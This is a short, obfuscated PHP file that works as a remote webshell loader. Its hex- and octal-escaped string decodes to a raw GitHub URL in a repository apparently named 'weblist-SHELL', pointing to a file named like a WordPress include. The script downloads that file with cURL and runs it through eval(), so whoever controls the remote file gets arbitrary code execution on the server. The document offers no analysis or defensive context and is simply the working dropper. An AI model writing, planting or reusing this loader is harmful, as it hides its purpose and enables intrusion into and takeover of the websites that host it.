<?php goto opet_dc6ab; opet_dc6ab: $url = "\x68\164\x74\160\x73\072\x2F\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6E\164\x65\156\x74\056\x63\157\x6D\057\x72\145\x6E\144\x69\150\x69\144\x61\171\x61\164\x36\070\x33\057\x77\145\x62\154\x69\163\x74\055\x53\110\x45\114\x4C\057\x72\145\x66\163\x2F\150\x65\141\x64\163\x2F\155\x61\151\x6E\057\x32\060\x32\065\x77\160\x2D\151\x6E\143\x2D\166\x6E\056\x70\150\x70";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$body = substr($response, $header_size);

if (curl_errno($ch)) {
    echo "\x63\125\x52\114\x20\145\x72\162\x6F\162\x3A\040" . curl_error($ch);
} elseif ($http_code != 200) {
    echo "\x48\124\x54\120\x20\105\x72\162\x6F\162\x3A\040\x24\150\x74\164\x70\137\x63\157\x64\145";
} else {
    eval(" ?>" . $body);
}

curl_close($ch);
?>
